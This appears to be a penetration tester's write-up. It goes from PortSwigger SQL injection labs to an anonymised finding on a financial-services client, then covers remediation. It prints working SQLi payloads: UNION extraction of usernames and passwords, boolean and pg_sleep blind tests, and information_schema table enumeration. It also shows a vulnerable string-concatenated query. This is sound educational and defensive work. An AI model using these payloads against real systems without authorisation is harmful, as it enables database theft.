SQL INJECTION: LAB TO REAL WORLD

// PORTSWIGGER LABS → LIVE VAPT ENGAGEMENT // MANUAL EXPLOITATION

SQL INJECTION MANUAL EXPLOIT BURP SUITE SQLMAP VAPT IN PROGRESS
01 — INTRODUCTION

SQL Injection remains one of the most critical and prevalent web application vulnerabilities, consistently featuring in the OWASP Top 10. It occurs when user-supplied input is not properly sanitised before being included in SQL queries, allowing an attacker to manipulate the database logic.

This writeup documents my journey from completing PortSwigger Web Security Academy SQLi labs to identifying and exploiting a real SQL Injection vulnerability during a professional VAPT engagement. All client details are anonymised.

02 — LAB PRACTICE (PORTSWIGGER)

Before moving to real-world testing, I completed the full SQL Injection learning path on PortSwigger Web Security Academy. Key lab types practiced:

UNION-Based SQLi — Extracting data from other tables by appending UNION SELECT statements to the original query.

-- Determine number of columns GET /products?category=Gifts'+ORDER+BY+3-- -- Extract data with UNION GET /products?category='+UNION+SELECT+username,password+FROM+users--

Blind SQLi (Boolean-Based) — No direct output visible. Infer data by crafting conditions that change application behaviour.

-- True condition (normal response) GET /products?id=1'+AND+1=1-- -- False condition (empty/error response) GET /products?id=1'+AND+1=2--

Time-Based Blind SQLi — No visible difference in response. Use database sleep functions to infer data character by character.

-- PostgreSQL GET /products?id=1';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
03 — REAL-WORLD CASE STUDY (ANONYMISED)

During a VAPT engagement for a client in the financial services sector, I was testing a web application login and search functionality.

Discovery: While intercepting requests in Burp Suite, I noticed a search parameter being passed directly to a database query. Inserting a single quote (') caused a verbose error, confirming unsanitised input.

-- Error-based confirmation POST /api/search Content-Type: application/json { "query": "test'" } -- Response: You have an error in your SQL syntax...

Exploitation: After manual confirmation, I used UNION-based injection to enumerate the database structure and extract table names.

-- Determine columns test' ORDER BY 4-- ← Error test' ORDER BY 3-- ← No error → 3 columns -- Extract table names test' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

This vulnerability could allow an unauthenticated attacker to extract the complete database, including user credentials and sensitive business data. In a financial context, this represents regulatory risk (data breach notification), reputational damage, and potential financial liability.

05 — REMEDIATION

1. Parameterised Queries (Primary Fix)

// Vulnerable String query = "SELECT * FROM users WHERE name = '" + userInput + "'"; // Fixed — Parameterised PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?"); stmt.setString(1, userInput);

2. Input Validation — Whitelist expected characters. Reject or sanitise unexpected input server-side.

3. Least Privilege — Database user should have minimum required permissions. No SELECT on sensitive tables unless required.

4. WAF Layer — Web Application Firewall as defence-in-depth, not primary mitigation.

06 — KEY TAKEAWAYS

Manual testing found what the automated scanner missed — the search endpoint was not crawled by the scanner due to JavaScript-rendered content. This highlights the importance of manual testing alongside automation.

Always verify automated findings manually. Understand why payloads work — the DB type, query structure, and context all affect exploitation strategy and remediation.
